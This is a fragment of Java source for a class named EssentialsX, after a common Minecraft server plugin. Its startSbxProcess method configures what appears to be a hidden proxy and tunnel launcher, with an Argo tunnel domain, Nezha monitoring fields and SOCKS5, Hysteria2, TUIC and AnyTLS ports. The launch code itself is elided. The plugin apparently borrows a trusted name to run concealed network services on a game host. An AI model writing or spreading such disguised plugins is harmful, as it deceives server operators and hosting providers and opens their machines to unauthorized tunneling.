...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "2981eddb-34fe-4d86-ad28-c01d15754712");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "nut.wxg.qzz.io");
        ...
        env.put("S5_PORT", "3330");
        env.put("HY2_PORT", "3330");
        env.put("TUIC_PORT", "3331");
        env.put("ANYTLS_PORT", "3332");
